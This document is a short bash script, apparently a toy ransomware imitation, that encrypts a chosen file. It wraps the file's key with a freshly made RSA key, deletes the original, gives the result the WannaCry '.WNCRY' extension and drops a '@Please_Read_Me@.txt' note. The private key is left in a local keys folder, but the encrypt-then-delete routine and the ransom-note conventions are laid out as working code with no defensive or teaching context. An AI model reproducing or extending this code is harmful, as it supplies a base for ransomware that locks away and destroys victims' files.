function helps {
echo "File crypter  -  help"
            echo "-f file to encrypt"
	    echo "Crypter need a file to work"
            exit 1       

}
function crypt {
if [ -f $1 ]; then
echo "$1 file selected"
else
echo "File not found"
exit
fi
mkdir keys
openssl genrsa -out key.pem 2048 
openssl rsa -in key.pem -out key.pub.pem -outform PEM -pubout 
openssl rand -base64 48 > key.txt
openssl enc -aes-256-cbc -pass file:key.txt -in "$1" -out "$1.WNCRY "
openssl rsautl -encrypt -in key.txt -out key.enc -inkey key.pub.pem -pubin
rm key.txt
rm $1
mv key.enc keys/key.enc
mv key.pem keys/key.pem
mv key.pub.pem keys/key.pub.pem
echo "Crypted"> @Please_Read_Me@.txt
echo "Finished.....Keys stored in /keys"
}

if [ $# == 2 ]; then

if [ "$1" == "-f" ]; then
crypt $2
else
helps
fi

else
helps
   
fi
